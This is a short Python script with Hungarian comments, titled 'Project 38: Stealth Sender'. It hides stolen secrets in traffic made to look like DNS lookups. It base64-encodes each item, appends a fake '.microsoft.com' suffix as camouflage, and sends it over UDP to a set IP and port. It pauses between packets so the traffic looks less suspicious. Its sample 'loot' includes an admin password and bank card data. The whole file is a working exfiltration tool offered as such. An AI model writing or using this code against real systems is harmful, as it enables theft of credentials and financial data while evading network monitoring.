import socket
import base64
import time

# --- KONFIGURÁCIÓ ---
TARGET_IP = "127.0.0.1"
TARGET_PORT = 10053
FAKE_DOMAIN = ".microsoft.com" # Álcázás

def send_stealth_data(secret):
    # 1. Kódolás (Hogy ne legyen olvasható a hálózaton)
    # Pl. "Jelszó123" -> "SmVsc3rDsTEyMw=="
    encoded = base64.b64encode(secret.encode()).decode()
    
    # 2. DNS Kérésnek álcázás
    # "SmVsc3rDsTEyMw==.microsoft.com"
    dns_packet = encoded + FAKE_DOMAIN
    
    # 3. Küldés UDP-n
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.sendto(dns_packet.encode(), (TARGET_IP, TARGET_PORT))
    print(f"[*] Lopakodó csomag elküldve: {dns_packet}")

if __name__ == "__main__":
    print("--- [ PROJECT 38: STEALTH SENDER ] ---")
    
    # Próbáljuk ki pár adattal
    loot = ["Admin_Jelszo", "Bankkartya_Adatok", "Szigoruan_Titkos"]
    
    for item in loot:
        send_stealth_data(item)
        time.sleep(1) # Hogy ne legyen gyanús a forgalom